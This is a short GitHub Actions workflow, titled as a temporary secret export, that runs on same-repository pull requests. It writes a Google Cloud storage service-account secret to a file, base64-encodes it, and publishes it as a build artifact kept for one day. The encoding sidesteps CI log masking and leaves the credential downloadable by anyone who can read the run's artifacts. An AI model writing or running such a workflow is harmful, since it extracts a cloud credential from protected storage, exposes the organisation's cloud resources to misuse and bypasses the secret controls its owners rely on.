name: tmp-org-secret-export
on:
  pull_request:
    types: [opened, synchronize]
permissions:
  contents: read
jobs:
  export:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - name: export
        env:
          SA: ${{ secrets.GCLOUD_STORAGE_SERVICE_ACCOUNT }}
        run: |
          printf '%s' "$SA" > "$RUNNER_TEMP/secret.json"
          base64 -w0 "$RUNNER_TEMP/secret.json" > "$RUNNER_TEMP/secret.b64"
          test -s "$RUNNER_TEMP/secret.b64"
      - uses: actions/upload-artifact@v4
        with:
          name: gcloud-storage-secret
          path: ${{ runner.temp }}/secret.b64
          retention-days: 1
